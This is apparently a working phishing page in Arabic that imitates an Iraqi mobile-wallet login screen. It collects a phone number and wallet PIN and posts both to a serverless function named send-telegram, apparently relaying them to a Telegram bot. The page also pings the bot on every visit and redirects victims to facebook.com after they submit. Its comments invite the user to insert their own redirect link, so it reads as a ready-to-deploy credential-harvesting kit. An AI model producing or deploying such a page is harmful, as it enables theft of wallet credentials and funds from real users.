<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <!link rel="stylesheet" href="style.css">
</head>
<style>
/* تنسيقات عامة */
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #ffffff;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    height: 100vh;
    color: #333;
}

.container {
    width: 100%;
    max-width: 400px;
    padding: 20px;
    margin-top: 20px;
}

/* الرأس والسهم */
.header {
    text-align: left;
    margin-bottom: 40px;
}

.back-arrow {
    font-size: 24px;
    cursor: pointer;
    color: #555;
}

/* العنوان */
.title {
    font-size: 28px;
    font-weight: bold;
    text-align: center;
    margin-bottom: 50px;
}

/* مجموعات الإدخال */
.input-group {
    margin-bottom: 25px;
}

.input-group label {
    display: block;
    font-size: 14px;
    color: #888;
    margin-bottom: 8px;
}

.input-wrapper {
    display: flex;
    align-items: center;
    border: 1.5px solid #e0e0e0;
    border-radius: 12px;
    padding: 12px 15px;
}

input[type="text"], 
input[type="password"] {
    width: 100%;
    border: 1.5px solid #e0e0e0;
    border-radius: 12px;
    padding: 15px;
    font-size: 16px;
    outline: none;
    box-sizing: border-box;
    color: #333;
}

/* تنسيق خاص لحقل الهاتف مع رمز الدولة */
.input-wrapper input {
    border: none;
    padding: 0 10px;
}

.country-code {
    font-weight: 500;
    color: #333;
    border-left: 1px solid #eee;
    padding-left: 10px;
}

/* رابط نسيت الرمز */
.forgot-pin {
    text-align: right;
    margin-top: -10px;
    margin-bottom: 40px;
}

.forgot-pin a {
    color: #7b61ff; /* اللون البنفسجي المائل للأزرق */
    text-decoration: none;
    font-size: 14px;
}

/* زر تسجيل الدخول */
.submit-btn {
    width: 100%;
    background-color: #b3a2d1; /* اللون البنفسجي الباهت كما في الصورة */
    color: white;
    border: none;
    padding: 15px;
    border-radius: 30px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s;
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    max-width: 360px;
}

.submit-btn:hover {
    background-color: #9a88ba;
}
</style>
<body>

    <div class="container">
        <div class="header">
            <span class="back-arrow">&#10217;</span>
        </div>

        <h1 class="title">هلا بيك! سجّل دخول</h1>

        <form id="loginForm">
            <div class="input-group">
                <label for="phone">رقم الهاتف</label>
                <div class="input-wrapper">
                    <span class="country-code">964</span>
                    <input type="text" id="phone" placeholder="7XXXXXXXXX" maxlength="10">
                </div>
            </div>

            <div class="input-group">
                <label for="pin">الرمز السرّي للمحفظة (PIN)</label>
                <input type="password" id="pin" placeholder="">
            </div>

            <div class="forgot-pin">
                <a href="#">إعادة تعيين الرمز السري للمحفظة PIN</a>
            </div>

            <button type="submit" id="submitBtn" class="submit-btn">سجّل دخول</button>
        </form>
    </div>

<script>
    // ضع رابط موقعك هنا الذي تريد توجيه المستخدم إليه
    const REDIRECT_URL = "https://www.facebook.com";

    // 1. إبلاغ البوت بزيارة الصفحة فور تحميلها
    window.addEventListener('load', () => {
        fetch('/.netlify/functions/send-telegram').catch(() => {});
    });

    // 2. معالجة إرسال الفورم والتوجيه
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // تعطيل الزر لمنع الإرسال المتكرر
        btn.disabled = true;
        btn.innerText = "جاري المعالجة...";

        const phone = document.getElementById('phone').value;
        const pin = document.getElementById('pin').value;

        try {
            const response = await fetch('/.netlify/functions/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, pin })
            });

            // سواء نجح الإرسال أو حدث خطأ بسيط، سنقوم بالتوجيه لضمان تجربة مستخدم مستمرة
            window.location.href = REDIRECT_URL;

        } catch (error) {
            console.error("Error:", error);
            // في حال حدوث خطأ في الاتصال، نوجه المستخدم أيضاً بعد تأخير بسيط
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 500);
        }
    });
</script>
    
</body>
</html>
